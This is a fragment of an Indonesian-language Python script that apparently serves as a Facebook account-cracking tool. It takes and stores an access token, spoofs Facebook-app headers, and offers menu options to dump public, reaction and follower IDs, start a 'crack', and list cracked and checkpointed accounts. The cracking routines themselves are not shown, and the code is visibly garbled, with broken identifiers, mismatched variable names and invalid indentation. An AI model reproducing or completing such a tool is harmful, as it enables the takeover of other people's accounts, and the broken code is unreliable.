...
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,___panggilan_____x______Zez_____,o)),
...
def banner():
	print('''
\033[0;33m____  ____  _____ __  __
\033[0;33m|  _ \|  _ \| ____|  \/  |
\033[0;33m| |_) | |_) |  _| | |\/| |
\033[0;33m|  __/|  _ <| |___| |  | |
\033[0;33m|_|   |_| \_\_____|_|  |_| 
''')
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def mmmasuk():
	os.system('clear');banner()
#M,P))
    zez(" \033[0;36m[\033[0;35m1\033[0;36m]\033[0;00m Token facebook")
    zez(" \033[0;36m[\033[0;35m2\033[0;36m]\033[0;00m Join group ") 
    _ze,z_xnxcode_ = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
    if _zez_xnxcode_ in(""):
	print("%s [!] Isi dengan benar "%(O));exit()
	elif _zez_xnxcode_ in ('1','01'):
		zez"\n%s [%s!%s] %sUntuk terhubung ke sarver anda harus login Terlebih dahulu"%(B,O,B,P))
		_zez_ganteng_kagakadapacar_ = raw_input('%s [%s+%s] %sToken : %s'%(B,O,B,P,B))
		if _jeeck_ganteng_kagakadapacar_ in(""):
			print("%s [!] Isi yang benar kentod "%(M));exit()
			try:
				gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(_zez_ganteng_zez_)).json()['name']
				print ('\n%s[√] Login berhasil, mohon tunggu:) '%(H));jeda(2)
				open('token.txt', 'w').write(_zez_ganteng_kagakadapacar_);login_xx()
				zez X genzi33 = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]")
				login_xx()
				menu()
        except (KeyError,IOError):
        	print("%s [!] Token invalid "%(M));masuk()
    elif _jeeck_xnxcode_ in ('2', '02'):
    	zez(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  -------------------------------------------------------------------------------------------------------- ")
        zez(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m                JOIN GROUP WA + FB ")
        zez(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  --------------------------------------------------------------------------------------------------------")
        zez(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  (1 Komunitas termux indonesia [ FACEBOOK ] ")
        zez(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  (2 KANG TERMUX [ WHATSAPP ] ")
        ...
        _kem_ = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]")
                ...
                os.system("xdg-open https://chat.whatsapp.com/DNU3M1vWcGRKcSUMVItlzb")
                _kem_ = raw_input("\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]")
                mmmasuk()
    elif _zez_xnxcode_ in ('0', '00'):
    	exit('\n')
    else:
    	zez(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar")
def menu():
    os.system('clear')
    try:
    	_zez_ganteng_kagakadapacar_ = open('token.txt', 'r').read()
    except IOError:
...
#    print (' Waktu : %s'%(datetime.now().strftime('%H:%M:%S'))
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_->")
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama       : %s "%(nama))
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m id  fb         : %s "%(id))
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Alamat ip : %s "%(IP))
    print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_->")
    print(" \033[0;36m[\033[0;35m1\x1b[0m\033[0;33m MULAI CRACK \033[0;00m[ \033[0;33mMULAI \033[0;00m]")
    print(" \033[0;36m[\033[0;35m2\x1b[0m\033[0;00m Dump ID PUBLIC \033[0;36m[ \033[0;00m4000+ \033[0;36m]")
    print(" \033[0;36m[\033[0;35m3\x1b[0m\033[0;00m DUMP ID REACTIONS POST \033[0;33m[ \033[0;00m500+ \033[0;33m]")
    print(" \033[0;36m[\033[0;35m4\x1b[0m\033[0;00m DUMP FOLLOWERS \033[0;33m[ \033[0;00m500+ \033[0;33m]")
    print(" \033[0;36m[\033[0;35m5\x1b[0m\033[0;00m GANTI USER/AGENT \033[0;33m[ \033[0;35mSETTING \033[0;33m]")
    print(" \033[0;36m[\033[0;35m6\x1b[0m' 033[0;00m CHEK HASIL CRACK \033[0;33m[ \033[0;00mLIHAT \033[0;33m]")
    print(" \033[0;36m[\033[0;35m7\x1b[0m\033[0;00m CHEK AKUN CP ")
    print(" \033[0;36m[\033[0;35m0\x1b[0m\033[0;00m Delet [ TOKEN ] \033[0;33m[ \033[0;00mHAPUS \033[0;33m] ")
    __zez__gz__x__xnxcode__ = raw_input(" \n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Menu : ")
    if __zez__gz__x__xnxcode__ == '':
        print(" \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar");jeda(2);menu()
    elif __zez__gz__x__xnxcode__ in['2','02']:
        publik(_zez_ganteng_kagakadapacar_)
    elif __zez__gz__x__xnxcode__ in['4','04']:
        followers(_jeeck_ganteng_kagakadapacar_)
    elif __zez__gz__x__xnxcode__ in['3','03']:
        postingan(_jeeck_ganteng_kagakadapacar_)
    elif __zez__gz__x__xnxcode__ in['1','01']:
        ngentod()._jeeck_xnxcode_iy()
    elif __zez__gz__x__xnxcode__ in['5','05']:
    	useragent()
    elif __zez__gz__x__xnxcode__ in['7','07']:
        cek_opsi()
    elif __zez__gz__x__xnxcode__ in['6','06']:
    	try:
            ...
            zez(" [%s+%s] total akun : %s"%(K,P,len(total)))
            print(" %s[%s+%s] ________________________________________"%(P,B,P));jeda(2)
            for akun in total:
            	fb = akun.replace("\n","")
            ...
            print("\n%s [!] tidak ada hasil "%(M))
            raw_input('\n%s [ %senter %s] '%(P,B,P));menu()
    elif __zez__gz__x__xnxcode__ in['0','00']:
        print ('')
